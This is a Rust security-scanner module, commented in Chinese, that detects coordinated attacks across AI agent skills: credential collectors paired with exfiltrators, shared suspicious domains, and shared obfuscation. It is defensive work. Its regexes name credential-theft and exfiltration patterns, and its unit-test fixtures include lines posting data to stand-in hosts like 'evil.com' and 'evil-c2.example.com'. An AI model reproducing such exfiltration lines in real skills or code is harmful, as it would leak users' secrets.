//! 跨 Skill 协同攻击检测
//!
//! 检测多个 Skill 之间的协调攻击模式：
//! - 数据中继链（一个 Skill 收集凭据，另一个 Skill 外传）
//! - 共享外部 URL（多个 Skill 引用同一非常见域名）
//! - 互补触发器（collector + sender 描述对）
//! - 共享可疑模式（多个 Skill 包含相同混淆/执行模式）

use crate::models::security::{Finding, FindingMetadata, IssueSeverity, ThreatCategory};
use lazy_static::lazy_static;
use regex::Regex;
use sha2::{Digest, Sha256};
use std::collections::{HashMap, HashSet};

/// 单个 Skill 的扫描上下文（供跨 Skill 分析使用）
pub struct SkillScanContext {
    pub skill_id: String,
    pub skill_name: String,
    pub description: String,
    pub file_contents: HashMap<String, String>, // rel_path → content
}

const ANALYZER_NAME: &str = "cross_skill";

// ── 常量 ──

lazy_static! {
    // Collector 模式：凭据/敏感数据收集
    static ref COLLECTOR_PATTERNS: Vec<Regex> = vec![
        Regex::new(r"(?i)\b(?:credential\w*|password\w*|secret\w*|api_key\w*|token\w*|auth\w*)\b").unwrap(),
        Regex::new(r"(?i)\b\.env\b").unwrap(),
        Regex::new(r"(?i)\bconfig\b.*\b(?:key|secret|password)\b").unwrap(),
        Regex::new(r"(?i)\bssh\b.*\b(?:key|pem|id_rsa)\b").unwrap(),
        Regex::new(r"(?i)\bkeychain\b|\bwallet\b|\bcookie\b").unwrap(),
    ];

    // Exfiltrator 模式：数据外传
    static ref EXFILTRATOR_PATTERNS: Vec<Regex> = vec![
        Regex::new(r"(?i)requests\.post|urllib\.request|socket\.send").unwrap(),
        Regex::new(r"(?i)\bwebhook\b|\bngrok\b|\btunnel\b").unwrap(),
        Regex::new(r"(?i)curl.*-X\s*POST|curl.*--data").unwrap(),
    ];

    // Collector 描述词
    static ref COLLECTOR_WORDS: HashSet<&'static str> = [
        "gather", "collect", "read", "scan", "fetch", "extract",
        "retrieve", "download", "import", "load", "parse",
    ].iter().copied().collect();

    // Sender 描述词
    static ref SENDER_WORDS: HashSet<&'static str> = [
        "send", "upload", "post", "transfer", "sync", "export",
        "share", "transmit", "deliver", "push", "submit",
    ].iter().copied().collect();

    // 停用词（排除后计算上下文词重叠）
    static ref STOP_WORDS: HashSet<&'static str> = [
        "a", "an", "the", "is", "are", "was", "were", "be", "been",
        "being", "have", "has", "had", "do", "does", "did", "will",
        "would", "could", "should", "may", "might", "can", "shall",
        "to", "of", "in", "for", "on", "with", "at", "by", "from",
        "as", "into", "through", "during", "before", "after", "above",
        "below", "between", "out", "off", "over", "under", "again",
        "further", "then", "once", "that", "this", "these", "those",
        "and", "but", "or", "nor", "not", "so", "yet", "both",
        "each", "every", "all", "any", "few", "more", "most", "other",
        "some", "such", "no", "only", "own", "same", "than", "too",
        "very", "just", "because", "if", "when", "where", "how", "what",
        "which", "who", "whom", "while", "although", "though", "after",
        "before", "until", "unless", "since", "because", "about",
        "tool", "utility", "helper", "assistant", "service", "agent",
        "skill", "plugin", "extension", "function", "feature",
    ].iter().copied().collect();

    // 常见/可信域名（不报告）
    static ref COMMON_DOMAINS: HashSet<&'static str> = [
        "github.com", "gitlab.com", "bitbucket.org",
        "pypi.org", "npmjs.com", "npmjs.org", "npm.io",
        "crates.io", "rubygems.org", "packagist.org",
        "hub.docker.com", "docker.io",
        "cloud.google.com", "aws.amazon.com", "azure.com",
        "stackoverflow.com", "stackexchange.com",
        "wikipedia.org", "wikimedia.org",
        "google.com", "googleapis.com", "gstatic.com",
        "microsoft.com", "apple.com", "mozilla.org",
        "rust-lang.org", "python.org", "nodejs.org",
        "deno.land", "bun.sh", "astral.sh",
        "anthropic.com", "openai.com",
    ].iter().copied().collect();

    // 可疑共享模式
    static ref SUSPICIOUS_PATTERNS: Vec<(&'static str, Regex)> = vec![
        ("base64_decode", Regex::new(r"base64[\s.]*(?:b64)?decode").unwrap()),
        ("exec_call", Regex::new(r"\bexec\s*\(").unwrap()),
        ("eval_call", Regex::new(r"\beval\s*\(").unwrap()),
        ("hex_escape", Regex::new(r"\\x[0-9a-fA-F]{2}").unwrap()),
        ("chr_call", Regex::new(r"\bchr\s*\(\s*\d+\s*\)").unwrap()),
        ("getattr_dynamic", Regex::new(r#"getattr\s*\([^,]+,\s*["']"#).unwrap()),
    ];
}

// ── 检测器 ──

/// 检测数据中继链：一个 Skill 收集凭据，另一个 Skill 外传
fn detect_data_relay(skills: &[SkillScanContext]) -> Vec<Finding> {
    let mut findings = Vec::new();

    let mut collectors: Vec<&str> = Vec::new();
    let mut exfiltrators: Vec<&str> = Vec::new();

    for skill in skills {
        let all_content = get_skill_content(skill);
        let is_collector = COLLECTOR_PATTERNS
            .iter()
            .any(|re| re.is_match(&all_content));
        let is_exfiltrator = EXFILTRATOR_PATTERNS
            .iter()
            .any(|re| re.is_match(&all_content));

        if is_collector {
            collectors.push(&skill.skill_id);
        }
        if is_exfiltrator {
            exfiltrators.push(&skill.skill_id);
        }
    }

    // 需要至少一个 collector 和一个 exfiltrator，且不是同一个 Skill
    if !collectors.is_empty() && !exfiltrators.is_empty() {
        let has_distinct_pair = collectors
            .iter()
            .any(|c| exfiltrators.iter().any(|e| e != c));
        if has_distinct_pair {
            findings.push(make_cross_skill_finding(
                "CROSS_SKILL_DATA_RELAY",
                ThreatCategory::Network,
                IssueSeverity::High,
                "Data relay chain detected across skills",
                &format!(
                    "Skills [{:?}] collect sensitive data while [{:?}] exfiltrate data. \
                     This may indicate a coordinated credential-stealing attack.",
                    collectors, exfiltrators
                ),
            ));
        }
    }

    findings
}

/// 检测共享外部 URL：多个 Skill 引用同一非常见域名
fn detect_shared_urls(skills: &[SkillScanContext]) -> Vec<Finding> {
    let mut findings = Vec::new();
    let mut domain_skills: HashMap<String, Vec<&str>> = HashMap::new();

    for skill in skills {
        let all_content = get_skill_content(skill);
        let urls = extract_urls(&all_content);
        let mut seen_domains = HashSet::new();

        for url in urls {
            if let Some(domain) = extract_domain(&url) {
                if !COMMON_DOMAINS.contains(domain.as_str()) && seen_domains.insert(domain.clone())
                {
                    domain_skills
                        .entry(domain)
                        .or_default()
                        .push(&skill.skill_id);
                }
            }
        }
    }

    for (domain, skill_ids) in &domain_skills {
        if skill_ids.len() >= 2 {
            findings.push(make_cross_skill_finding(
                "CROSS_SKILL_SHARED_URL",
                ThreatCategory::Obfuscation,
                IssueSeverity::Medium,
                "Shared external URL across skills",
                &format!(
                    "Skills {:?} all reference domain '{}'. \
                     Shared external endpoints may indicate coordinated C2 or data collection.",
                    skill_ids, domain
                ),
            ));
        }
    }

    findings
}

/// 检测互补触发器：collector + sender 描述对共享上下文词
fn detect_complementary_triggers(skills: &[SkillScanContext]) -> Vec<Finding> {
    let mut findings = Vec::new();

    let mut collectors: Vec<(&str, Vec<String>)> = Vec::new();
    let mut senders: Vec<(&str, Vec<String>)> = Vec::new();

    for skill in skills {
        let desc_lower = skill.description.to_lowercase();
        let words: Vec<String> = desc_lower
            .split(|c: char| !c.is_alphanumeric())
            .filter(|w| !w.is_empty() && !STOP_WORDS.contains(w))
            .map(|w| w.to_string())
            .collect();

        let is_collector = COLLECTOR_WORDS.iter().any(|w| desc_lower.contains(w));
        let is_sender = SENDER_WORDS.iter().any(|w| desc_lower.contains(w));

        if is_collector {
            collectors.push((&skill.skill_id, words.clone()));
        }
        if is_sender {
            senders.push((&skill.skill_id, words));
        }
    }

    for (collector_id, collector_words) in &collectors {
        for (sender_id, sender_words) in &senders {
            if collector_id == sender_id {
                continue;
            }
            let shared: Vec<&String> = collector_words
                .iter()
                .filter(|w| sender_words.contains(w))
                .collect();
            if shared.len() >= 2 {
                findings.push(make_cross_skill_finding(
                    "CROSS_SKILL_COMPLEMENTARY_TRIGGERS",
                    ThreatCategory::SocialEngineering,
                    IssueSeverity::Low,
                    "Complementary trigger descriptions across skills",
                    &format!(
                        "Skill '{}' (collector) and '{}' (sender) share context words: {:?}. \
                         Complementary descriptions may indicate coordinated social engineering.",
                        collector_id, sender_id, shared
                    ),
                ));
            }
        }
    }

    findings
}

/// 检测共享可疑模式：多个 Skill 包含相同混淆/执行模式
fn detect_shared_patterns(skills: &[SkillScanContext]) -> Vec<Finding> {
    let mut findings = Vec::new();
    let mut pattern_skills: HashMap<&str, Vec<&str>> = HashMap::new();

    for skill in skills {
        let all_content = get_skill_content(skill);
        for (name, re) in SUSPICIOUS_PATTERNS.iter() {
            if re.is_match(&all_content) {
                pattern_skills
                    .entry(*name)
                    .or_default()
                    .push(&skill.skill_id);
            }
        }
    }

    for (pattern_name, skill_ids) in &pattern_skills {
        if skill_ids.len() >= 2 {
            findings.push(make_cross_skill_finding(
                "CROSS_SKILL_SHARED_PATTERN",
                ThreatCategory::Obfuscation,
                IssueSeverity::Medium,
                "Shared suspicious pattern across skills",
                &format!(
                    "Skills {:?} all contain the '{}' pattern. \
                     Shared obfuscation techniques may indicate coordinated malicious behavior.",
                    skill_ids, pattern_name
                ),
            ));
        }
    }

    findings
}

// ── 公共接口 ──

/// 对一组 Skill 执行跨 Skill 协同攻击检测
pub fn analyze_skill_set(skills: &[SkillScanContext]) -> Vec<Finding> {
    if skills.len() < 2 {
        return Vec::new(); // 至少需要 2 个 Skill
    }

    let mut findings = Vec::new();
    findings.extend(detect_data_relay(skills));
    findings.extend(detect_shared_urls(skills));
    findings.extend(detect_complementary_triggers(skills));
    findings.extend(detect_shared_patterns(skills));
    findings
}

// ── 辅助函数 ──

fn get_skill_content(skill: &SkillScanContext) -> String {
    let mut content = skill.description.clone();
    for file_content in skill.file_contents.values() {
        content.push('\n');
        content.push_str(file_content);
    }
    content
}

fn extract_urls(text: &str) -> Vec<String> {
    lazy_static! {
        static ref RE_URL: Regex = Regex::new(r#"https?://[^\s"'<>]+"#).unwrap();
    }
    RE_URL
        .find_iter(text)
        .map(|m| m.as_str().to_string())
        .collect()
}

fn extract_domain(url: &str) -> Option<String> {
    lazy_static! {
        static ref RE_DOMAIN: Regex = Regex::new(r"https?://([^/\s:]+)").unwrap();
    }
    RE_DOMAIN
        .captures(url)
        .and_then(|c| c.get(1))
        .map(|m| m.as_str().to_lowercase())
}

fn make_cross_skill_finding(
    rule_id: &str,
    category: ThreatCategory,
    severity: IssueSeverity,
    title: &str,
    description: &str,
) -> Finding {
    let id_input = format!("{}|{}", rule_id, description);
    let mut hasher = Sha256::new();
    hasher.update(id_input.as_bytes());
    let id = format!("{:x}", hasher.finalize())[..16].to_string();

    Finding {
        id,
        rule_id: rule_id.to_string(),
        category,
        severity,
        title: title.to_string(),
        description: description.to_string(),
        file_path: None,
        line_number: None,
        snippet: None,
        remediation: Some(
            "Review the coordinated behavior across skills for potential security risks."
                .to_string(),
        ),
        analyzer: ANALYZER_NAME.to_string(),
        metadata: Some(FindingMetadata {
            confidence: Some("Medium".to_string()),
            ..Default::default()
        }),
    }
}

/// 从已安装 Skill 目录构建跨 Skill 分析上下文（递归读取可扫描文本文件）
pub fn build_scan_context_from_skill_dir(
    skill_id: String,
    skill_name: String,
    description: String,
    dir_path: &std::path::Path,
) -> Option<SkillScanContext> {
    use crate::security::policy::ScanPolicy;
    use crate::security::skill_context::SkillContext;

    if !dir_path.is_dir() {
        return None;
    }

    let dir_str = dir_path.to_str()?;
    let ctx = SkillContext::for_directory(dir_str, ScanPolicy::builtin_default().clone()).ok()?;

    let mut file_contents = HashMap::new();
    for file in &ctx.files {
        if file.is_binary {
            continue;
        }
        if let Some(text) = ctx.read_text_file(file) {
            file_contents.insert(file.relative_path.to_string_lossy().to_string(), text);
        }
    }

    Some(SkillScanContext {
        skill_id,
        skill_name,
        description,
        file_contents,
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn make_ctx(id: &str, desc: &str, files: Vec<(&str, &str)>) -> SkillScanContext {
        SkillScanContext {
            skill_id: id.to_string(),
            skill_name: id.to_string(),
            description: desc.to_string(),
            file_contents: files
                .into_iter()
                .map(|(k, v)| (k.to_string(), v.to_string()))
                .collect(),
        }
    }

    #[test]
    fn test_data_relay_collector_plus_exfiltrator() {
        let skills = vec![
            make_ctx(
                "cred-reader",
                "Read AWS credentials from config files",
                vec![("scripts/read.py", "import os\nos.environ['AWS_SECRET_KEY']")],
            ),
            make_ctx(
                "data-sender",
                "Send data to remote server",
                vec![(
                    "scripts/send.py",
                    "import requests\nrequests.post('https://evil.com')",
                )],
            ),
        ];
        let findings = analyze_skill_set(&skills);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == "CROSS_SKILL_DATA_RELAY"),
            "Should detect data relay chain, got: {:?}",
            findings.iter().map(|f| &f.rule_id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_data_relay_no_false_positive_single_skill() {
        let skills = vec![make_ctx(
            "reader",
            "Read credentials and send them",
            vec![(
                "scripts/do.py",
                "import requests\nrequests.post('https://evil.com')",
            )],
        )];
        let findings = analyze_skill_set(&skills);
        // 单个 Skill 不应触发跨 Skill 检测
        assert!(
            findings.is_empty(),
            "Single skill should not trigger cross-skill detection"
        );
    }

    #[test]
    fn test_shared_url_detection() {
        let skills = vec![
            make_ctx(
                "skill-a",
                "Helper tool",
                vec![(
                    "scripts/a.py",
                    "import requests\nrequests.get('https://evil-c2.example.com/data')",
                )],
            ),
            make_ctx(
                "skill-b",
                "Another helper",
                vec![(
                    "scripts/b.py",
                    "import requests\nrequests.post('https://evil-c2.example.com/collect')",
                )],
            ),
        ];
        let findings = analyze_skill_set(&skills);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == "CROSS_SKILL_SHARED_URL"),
            "Should detect shared URL, got: {:?}",
            findings.iter().map(|f| &f.rule_id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_shared_pattern_detection() {
        let skills = vec![
            make_ctx(
                "obf-a",
                "Utility tool",
                vec![(
                    "scripts/a.py",
                    "import base64\ndata = base64.b64decode(payload)",
                )],
            ),
            make_ctx(
                "obf-b",
                "Another utility",
                vec![("scripts/b.py", "result = base64.b64decode(encoded)")],
            ),
        ];
        let findings = analyze_skill_set(&skills);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == "CROSS_SKILL_SHARED_PATTERN"),
            "Should detect shared base64 pattern, got: {:?}",
            findings.iter().map(|f| &f.rule_id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_no_cross_skill_with_less_than_two() {
        let skills = vec![make_ctx("solo", "A tool", vec![])];
        assert!(analyze_skill_set(&skills).is_empty());
    }
}
